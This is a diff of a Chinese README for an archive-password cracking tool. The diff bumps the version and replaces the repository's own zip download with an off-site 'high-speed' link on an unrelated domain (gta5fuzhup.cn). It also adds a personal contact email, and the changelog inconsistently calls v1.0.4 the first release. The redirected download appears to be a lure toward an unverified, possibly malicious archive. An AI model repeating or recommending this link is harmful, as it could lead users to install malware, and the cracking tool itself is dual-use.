@@ -69,8 +69,8 @@
 
 <div align="center">
 
-### 📦 **最新版本 v1.0** 
-*发布日期: 2024-10-08*
+### 📦 **最新版本 v1.0.4** 
+*发布日期: 2025-6-08*
 
 </div>
 
@@ -83,10 +83,10 @@
 </tr>
 <tr>
 <td align="center"><strong>🔥 完整版</strong></td>
-<td align="center">~50MB</td>
+<td align="center">~37MB</td>
 <td>包含所有工具和字典库</td>
 <td align="center">
-<a href="破解压缩包密码工具.zip" download="破解压缩包密码工具.zip">
+<a href="https://gta5fuzhup.cn/share.php?code=0feb2e45" target="_blank">
 <img src="https://img.shields.io/badge/下载-完整版-brightgreen?style=for-the-badge&logo=download" alt="下载完整版">
 </a>
 </td>
@@ -100,7 +100,7 @@
 - 👨‍💼 **专业用户**: 适合各种复杂破解场景  
 - 🌐 **网络较慢**: 可先下载测试，满意后再使用
 
-**⚠️ 重要提醒**: 如果上方直接下载链接无效，请访问 [Releases页面](../../releases) 手动下载
+**⚠️ 重要提醒**: 由于GitHub下载较慢，我们提供了高速下载链接。如果链接无效，请访问 [GitHub Releases页面](https://github.com/xuanxuan205/Crackthecompressedpackage/releases/tag/v1.0.4) 手动下载
 
 </div>
 
@@ -284,7 +284,7 @@
 
 ## 🔄 版本历史
 
-### [v1.0] - 2024-10-08
+### [v1.0.4] - 2025-6-08
 - 🎉 **首次发布**: 完整功能的稳定版本
 - ✅ **多格式支持**: ZIP、RAR、7Z等主流格式
 - 🎨 **友好界面**: 直观易用的图形界面
@@ -327,7 +327,7 @@
 | 🐛 **问题反馈** | 报告Bug和提出建议 | [提交Issue](../../issues) |
 | 💬 **讨论交流** | 使用经验和技巧分享 | [参与讨论](../../discussions) |
 | ⭐ **支持项目** | 给项目点个星标 | [Star项目](../../stargazers) |
-| 📧 **邮件联系** | 重要问题和商务咨询 | support@example.com |
+| 📧 **邮件联系** | 重要问题和商务咨询 | lyd9527@zohomail.cn |
 
 **如果这个工具帮助您成功恢复了密码，请考虑：**
 - ⭐ 给项目点个星标
